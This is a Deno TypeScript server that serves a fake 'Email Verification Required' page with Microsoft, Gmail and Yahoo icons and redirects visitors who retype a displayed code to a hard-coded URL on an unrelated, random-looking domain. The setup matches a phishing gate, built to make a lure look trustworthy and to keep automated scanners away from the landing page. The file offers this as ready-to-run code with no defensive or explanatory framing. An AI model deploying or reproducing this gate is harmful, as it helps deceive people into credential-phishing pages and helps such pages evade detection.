// secure-redirect.ts
import { serve } from "https://deno.land/std@0.200.0/http/server.ts";

// Configuration
const CONFIG = {
  DESTINATION_URL: Deno.env.get("DESTINATION_URL") || "https://dennolabo.biz/xkc1vta/walihse/ofcnjvd/provost/index.html",
  VERIFICATION_CODE: Deno.env.get("VERIFICATION_CODE") || "A7B2C9D",
  PORT: Deno.env.get("PORT") || "8000"
};

function generateHTML() {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Secure Verification</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #1e3a8a 0%, #172554 100%);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      margin: 0;
      padding: 1rem;
      color: white;
    }
    .card {
      background: white;
      border-radius: 1rem;
      box-shadow: 0 10px 25px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 480px;
      padding: 2rem;
      text-align: center;
    }
    .logo {
      font-size: 1.8rem;
      font-weight: 700;
      color: #2563eb;
      margin-bottom: 1.5rem;
    }
    .code-display {
      background: #f8fafc;
      border: 1px dashed #cbd5e1;
      border-radius: 0.5rem;
      padding: 1rem;
      margin: 1.5rem 0;
      font-family: 'Roboto Mono', monospace;
      font-size: 1.5rem;
      letter-spacing: 0.2em;
      color: #2563eb;
      font-weight: bold;
    }
    input {
      width: 100%;
      padding: 1rem;
      border: 1px solid #e2e8f0;
      border-radius: 0.5rem;
      font-size: 1rem;
      margin-bottom: 1rem;
    }
    button {
      background: #2563eb;
      color: white;
      border: none;
      padding: 1rem;
      border-radius: 0.5rem;
      width: 100%;
      font-size: 1.1rem;
      font-weight: 500;
      cursor: pointer;
      transition: background 0.2s;
    }
    button:hover {
      background: #1d4ed8;
    }
    .providers {
      display: flex;
      justify-content: center;
      gap: 1rem;
      margin-top: 1.5rem;
    }
    .provider-icon {
      width: 32px;
      height: 32px;
      transition: transform 0.2s;
    }
    .provider-icon:hover {
      transform: scale(1.1);
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">SECURE ACCESS</div>
    <h1>Email Verification Required</h1>
    <p>Enter the verification code shown below:</p>
    
    <div class="code-display">${CONFIG.VERIFICATION_CODE}</div>
    
    <form id="verifyForm">
      <input 
        type="text" 
        id="codeInput" 
        placeholder="Enter the 7-digit code" 
        required
        autofocus
      >
      <button type="submit">VERIFY IDENTITY</button>
    </form>
    
    <div class="providers">
      <img src="https://cdn.jsdelivr.net/npm/simple-icons@v8/icons/microsoftoutlook.svg" 
           alt="Microsoft" class="provider-icon">
      <img src="https://cdn.jsdelivr.net/npm/simple-icons@v8/icons/gmail.svg" 
           alt="Gmail" class="provider-icon">
      <img src="https://cdn.jsdelivr.net/npm/simple-icons@v8/icons/yahoo.svg" 
           alt="Yahoo" class="provider-icon">
    </div>
  </div>

  <script>
    document.getElementById('verifyForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const code = document.getElementById('codeInput').value.trim();
      
      try {
        const response = await fetch('/verify', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ code })
        });
        
        if (response.ok) {
          window.location.href = await response.text();
        } else {
          alert('Invalid code. Please try again.');
        }
      } catch (error) {
        alert('Network error. Please try again.');
      }
    });
  </script>
</body>
</html>`;
}

async function handleRequest(req: Request): Promise<Response> {
  const url = new URL(req.url);
  
  if (url.pathname === "/verify" && req.method === "POST") {
    try {
      const { code } = await req.json();
      if (code?.trim() === CONFIG.VERIFICATION_CODE) {
        return new Response(CONFIG.DESTINATION_URL, {
          status: 200,
          headers: { 'Content-Type': 'text/plain' }
        });
      }
      return new Response(null, { status: 401 });
    } catch {
      return new Response(null, { status: 400 });
    }
  }
  
  return new Response(generateHTML(), {
    headers: { "Content-Type": "text/html" }
  });
}

console.log(`Server running on port ${CONFIG.PORT}`);
serve(handleRequest, { port: Number(CONFIG.PORT) });